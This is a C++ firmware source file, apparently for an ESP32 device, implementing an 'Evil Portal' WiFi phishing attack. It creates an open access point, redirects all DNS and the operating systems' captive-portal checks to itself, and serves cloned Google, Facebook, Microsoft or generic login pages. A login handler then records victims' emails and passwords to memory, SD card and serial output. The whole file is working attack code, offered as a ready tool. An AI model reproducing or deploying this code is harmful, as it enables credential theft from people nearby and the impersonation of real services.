/**
 * @file EvilPortal.cpp
 * @brief Evil Portal implementation - Captive portal for credential capture
 */

#include "EvilPortal.h"
#include "../core/SDManager.h"

namespace Vanguard {

// Static instance for callbacks
EvilPortal* EvilPortal::s_instance = nullptr;

// =============================================================================
// PORTAL HTML TEMPLATES
// =============================================================================

// Generic WiFi login page - clean, mobile-friendly
static const char PORTAL_HTML_GENERIC[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 10px;
            font-size: 24px;
        }
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .ssid {
            background: #f0f0f0;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 25px;
            font-weight: bold;
            color: #333;
        }
        input {
            width: 100%;
            padding: 15px;
            margin-bottom: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #999;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>WiFi Authentication</h1>
        <p class="subtitle">Please sign in to access the internet</p>
        <div class="ssid">%SSID%</div>
        <form action="/login" method="POST">
            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="hidden" name="ssid" value="%SSID%">
            <button type="submit">Connect</button>
        </form>
        <p class="footer">Secure connection</p>
    </div>
</body>
</html>
)rawliteral";

// Google-style login page
static const char PORTAL_HTML_GOOGLE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 48px 40px;
            border-radius: 8px;
            border: 1px solid #dadce0;
            width: 100%;
            max-width: 450px;
        }
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .logo span {
            font-size: 32px;
            font-weight: 500;
        }
        .logo .g { color: #4285f4; }
        .logo .o1 { color: #ea4335; }
        .logo .o2 { color: #fbbc05; }
        .logo .g2 { color: #4285f4; }
        .logo .l { color: #34a853; }
        .logo .e { color: #ea4335; }
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            color: #5f6368;
            margin-bottom: 24px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            margin-bottom: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            border-color: #1a73e8;
            border-width: 2px;
        }
        .forgot {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin-bottom: 24px;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        button:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to WiFi</p>
        <form action="/login" method="POST">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <input type="hidden" name="ssid" value="%SSID%">
            <a href="#" class="forgot">Forgot password?</a>
            <div class="buttons">
                <a href="#" class="create">Create account</a>
                <button type="submit">Next</button>
            </div>
        </form>
    </div>
</body>
</html>
)rawliteral";

// Facebook-style login page
static const char PORTAL_HTML_FACEBOOK[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Helvetica,Arial;background:#f0f2f5;margin:0}
.wrap{max-width:396px;margin:80px auto;padding:20px}
.logo{color:#1877f2;font-size:42px;font-weight:700;text-align:center;margin-bottom:16px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);padding:20px}
input{width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;box-sizing:border-box}
button{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-top:6px}
.divider{border-top:1px solid #dadde1;margin:20px 0}
</style></head><body><div class="wrap"><div class="logo">facebook</div><div class="card">
<form action="/login" method="POST">
<input name="email" placeholder="Email or phone number" required>
<input name="password" type="password" placeholder="Password" required>
<input type="hidden" name="ssid" value="%SSID%">
<button type="submit">Log In</button>
</form><div class="divider"></div>
<p style="text-align:center;color:#65676b;font-size:14px">Secure login - WiFi verification required</p>
</div></div></body></html>
)rawliteral";

// Microsoft-style login page
static const char PORTAL_HTML_MICROSOFT[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Segoe UI,Arial;background:#f2f2f2;margin:0;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#fff;width:440px;max-width:90%;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.logo{font-size:24px;font-weight:600;margin-bottom:16px}
.ms{color:#737373;font-size:15px;margin-bottom:24px}
input{width:100%;padding:10px 8px;margin:8px 0;border:none;border-bottom:1px solid #666;font-size:15px;box-sizing:border-box;outline:none}
input:focus{border-bottom:2px solid #0067b8}
button{padding:10px 40px;background:#0067b8;color:#fff;border:none;font-size:15px;cursor:pointer;float:right;margin-top:16px}
a{color:#0067b8;font-size:13px;text-decoration:none}
</style></head><body><div class="card"><div class="logo">Microsoft</div>
<div class="ms">Sign in to your account</div>
<form action="/login" method="POST">
<input name="email" placeholder="Email, phone, or Skype" required>
<input name="password" type="password" placeholder="Password" required>
<input type="hidden" name="ssid" value="%SSID%">
<br><a href="#">Forgot password?</a>
<button type="submit">Sign in</button>
</form></div></body></html>
)rawliteral";

// Success page after login
static const char SUCCESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            text-align: center;
        }
        .container { padding: 40px; }
        .check {
            font-size: 80px;
            margin-bottom: 20px;
        }
        h1 { font-size: 28px; margin-bottom: 10px; }
        p { opacity: 0.9; }
    </style>
</head>
<body>
    <div class="container">
        <div class="check">&#10004;</div>
        <h1>Connected!</h1>
        <p>You are now connected to the internet.</p>
        <p>This window will close automatically.</p>
    </div>
</body>
</html>
)rawliteral";

// =============================================================================
// SINGLETON
// =============================================================================

EvilPortal& EvilPortal::getInstance() {
    static EvilPortal instance;
    return instance;
}

EvilPortal::EvilPortal()
    : m_running(false)
    , m_channel(1)
    , m_template(PortalTemplate::GENERIC_WIFI)
    , m_dnsServer(nullptr)
    , m_webServer(nullptr)
    , m_onCredential(nullptr)
    , m_onClientConnected(nullptr)
    , m_lastClientCount(0)
{
    memset(m_ssid, 0, sizeof(m_ssid));
    s_instance = this;
}

EvilPortal::~EvilPortal() {
    stop();
    s_instance = nullptr;
}

// =============================================================================
// LIFECYCLE
// =============================================================================

bool EvilPortal::start(const char* ssid, uint8_t channel, PortalTemplate tmpl) {
    if (m_running) {
        stop();
    }

    if (!ssid || strlen(ssid) == 0) {
        return false;
    }

    // Store config
    strncpy(m_ssid, ssid, 32);
    m_ssid[32] = '\0';
    m_channel = channel;
    m_template = tmpl;

    // [PHASE 3.2] Custom Template Loading from SD
    if (tmpl == PortalTemplate::CUSTOM) {
        m_customHtml = SDManager::getInstance().readFile("/evil_portal/templates/index.html");
        if (m_customHtml.length() == 0) {
            if (Serial) Serial.println("[EvilPortal] Custom template not found on SD, falling back to GENERIC");
            m_template = PortalTemplate::GENERIC_WIFI;
        } else {
            if (Serial) Serial.println("[EvilPortal] Custom template loaded from SD");
        }
    }

    if (Serial) {
        Serial.printf("[EvilPortal] Starting AP '%s' on ch %d...\n", ssid, channel);
    }

    // Stop any existing WiFi activity with watchdog feeding
    WiFi.disconnect(true);
    yield();
    WiFi.mode(WIFI_OFF);

    // Transition delay with watchdog feeding
    for (int i = 0; i < 20; i++) {
        yield();
        delay(5);
    }

    // Configure as access point
    WiFi.mode(WIFI_AP);
    yield();

    IPAddress apIP(192, 168, 4, 1);
    IPAddress gateway(192, 168, 4, 1);
    IPAddress subnet(255, 255, 255, 0);

    WiFi.softAPConfig(apIP, gateway, subnet);
    yield();

    // Start AP (open network)
    if (!WiFi.softAP(m_ssid, "", m_channel)) {
        if (Serial) {
            Serial.println("[EvilPortal] Failed to start AP!");
        }
        WiFi.mode(WIFI_STA);
        return false;
    }
    yield();

    if (Serial) {
        Serial.printf("[EvilPortal] AP started, IP: %s\n",
                      WiFi.softAPIP().toString().c_str());
    }

    // Start DNS server (redirect all to our IP)
    m_dnsServer = new DNSServer();
    m_dnsServer->setErrorReplyCode(DNSReplyCode::NoError);
    m_dnsServer->start(DNS_PORT, "*", apIP);
    yield();

    // Start web server
    m_webServer = new AsyncWebServer(WEB_PORT);
    setupRoutes();
    m_webServer->begin();
    yield();

    m_running = true;
    m_credentials.clear();
    m_lastClientCount = 0;

    if (Serial) {
        Serial.println("[EvilPortal] Portal active!");
    }

    return true;
}

void EvilPortal::stop() {
    if (!m_running) return;

    if (Serial) {
        Serial.printf("[EvilPortal] Stopping. Captured %d credentials.\n",
                      m_credentials.size());
    }

    // Stop web server
    if (m_webServer) {
        m_webServer->end();
        delete m_webServer;
        m_webServer = nullptr;
    }
    yield();

    // Stop DNS
    if (m_dnsServer) {
        m_dnsServer->stop();
        delete m_dnsServer;
        m_dnsServer = nullptr;
    }
    yield();

    // Stop AP
    WiFi.softAPdisconnect(true);
    yield();
    WiFi.mode(WIFI_OFF);

    // Transition delay
    for (int i = 0; i < 10; i++) {
        yield();
        delay(5);
    }

    // Restore station mode
    WiFi.mode(WIFI_STA);
    yield();

    m_running = false;
}

void EvilPortal::tick() {
    if (!m_running) return;

    // Feed watchdog
    yield();

    // Process DNS requests
    if (m_dnsServer) {
        m_dnsServer->processNextRequest();
    }

    yield();

    // Check for client count changes
    int currentClients = WiFi.softAPgetStationNum();
    if (currentClients != m_lastClientCount) {
        m_lastClientCount = currentClients;
        if (m_onClientConnected) {
            m_onClientConnected(currentClients);
        }
        if (Serial) {
            Serial.printf("[EvilPortal] Clients: %d\n", currentClients);
        }
    }
}

// =============================================================================
// CONFIGURATION
// =============================================================================

void EvilPortal::setCustomHtml(const char* html) {
    m_customHtml = html;
    m_template = PortalTemplate::CUSTOM;
}

void EvilPortal::setTemplate(PortalTemplate tmpl) {
    m_template = tmpl;
}

int EvilPortal::getClientCount() const {
    if (!m_running) return 0;
    return WiFi.softAPgetStationNum();
}

// =============================================================================
// WEB SERVER ROUTES
// =============================================================================

void EvilPortal::setupRoutes() {
    if (!m_webServer) return;

    // Main page - captive portal
    m_webServer->on("/", HTTP_GET, handleRoot);

    // Login handler
    m_webServer->on("/login", HTTP_POST, handleLogin);

    // Captive portal detection URLs (various OS/browsers)
    m_webServer->on("/generate_204", HTTP_GET, handleRoot);      // Android
    m_webServer->on("/gen_204", HTTP_GET, handleRoot);           // Android
    m_webServer->on("/hotspot-detect.html", HTTP_GET, handleRoot); // Apple
    m_webServer->on("/library/test/success.html", HTTP_GET, handleRoot); // Apple
    m_webServer->on("/ncsi.txt", HTTP_GET, handleRoot);          // Windows
    m_webServer->on("/connecttest.txt", HTTP_GET, handleRoot);   // Windows
    m_webServer->on("/redirect", HTTP_GET, handleRoot);          // Windows 11
    m_webServer->on("/canonical.html", HTTP_GET, handleRoot);    // Firefox

    // Catch-all for any other request
    m_webServer->onNotFound(handleNotFound);
}

// =============================================================================
// REQUEST HANDLERS
// =============================================================================

void EvilPortal::handleRoot(AsyncWebServerRequest* request) {
    if (!s_instance) {
        request->send(500, "text/plain", "Error");
        return;
    }

    String html = s_instance->getPortalHtml();
    request->send(200, "text/html", html);

    if (Serial) {
        Serial.printf("[EvilPortal] Served portal to %s\n",
                      request->client()->remoteIP().toString().c_str());
    }
}

void EvilPortal::handleLogin(AsyncWebServerRequest* request) {
    if (!s_instance) {
        request->send(500, "text/plain", "Error");
        return;
    }

    // Extract credentials
    CapturedCredential cred;
    memset(&cred, 0, sizeof(cred));

    if (request->hasParam("email", true)) {
        strncpy(cred.username, request->getParam("email", true)->value().c_str(), 64);
    }
    if (request->hasParam("password", true)) {
        strncpy(cred.password, request->getParam("password", true)->value().c_str(), 64);
    }
    if (request->hasParam("ssid", true)) {
        strncpy(cred.ssid, request->getParam("ssid", true)->value().c_str(), 32);
    } else {
        strncpy(cred.ssid, s_instance->m_ssid, 32);
    }

    cred.capturedMs = millis();
    snprintf(cred.clientMac, sizeof(cred.clientMac), "%s",
             request->client()->remoteIP().toString().c_str());

    // Store credential (RAM Cache)
    if (s_instance->m_credentials.size() < MAX_CREDENTIALS) {
        s_instance->m_credentials.push_back(cred);
    }

    // [PHASE 3.2] SD Persistence
    SDManager::getInstance().logCredential(s_instance->m_ssid, cred.username, cred.password, cred.clientMac);

    // Fire callback
    if (s_instance->m_onCredential) {
        s_instance->m_onCredential(cred);
    }

    if (Serial) {
        Serial.printf("[EvilPortal] CAPTURED: %s / %s\n",
                      cred.username, cred.password);
    }

    // Send success page
    String html = s_instance->getSuccessHtml();
    request->send(200, "text/html", html);
}

void EvilPortal::handleNotFound(AsyncWebServerRequest* request) {
    // Redirect everything to the portal
    request->redirect("/");
}

// =============================================================================
// HTML GENERATION
// =============================================================================

String EvilPortal::getPortalHtml() {
    String html;

    switch (m_template) {
        case PortalTemplate::GOOGLE:
            html = FPSTR(PORTAL_HTML_GOOGLE);
            break;
        case PortalTemplate::FACEBOOK:
            html = FPSTR(PORTAL_HTML_FACEBOOK);
            break;
        case PortalTemplate::MICROSOFT:
            html = FPSTR(PORTAL_HTML_MICROSOFT);
            break;
        case PortalTemplate::CUSTOM:
            if (m_customHtml.length() > 0) {
                html = m_customHtml;
                break;
            }
            // Fallthrough to generic if custom empty
        case PortalTemplate::GENERIC_WIFI:
        default:
            html = FPSTR(PORTAL_HTML_GENERIC);
            break;
    }

    // Replace SSID placeholder
    html.replace("%SSID%", m_ssid);

    return html;
}

String EvilPortal::getSuccessHtml() {
    return FPSTR(SUCCESS_HTML);
}

const char* EvilPortal::getTemplateHtml(PortalTemplate tpl) {
    switch (tpl) {
        case PortalTemplate::FACEBOOK:   return PORTAL_HTML_FACEBOOK;
        case PortalTemplate::MICROSOFT:  return PORTAL_HTML_MICROSOFT;
        case PortalTemplate::GOOGLE:     return PORTAL_HTML_GOOGLE;
        case PortalTemplate::GENERIC_WIFI:
        default:                         return PORTAL_HTML_GENERIC;
    }
}

} // namespace Vanguard
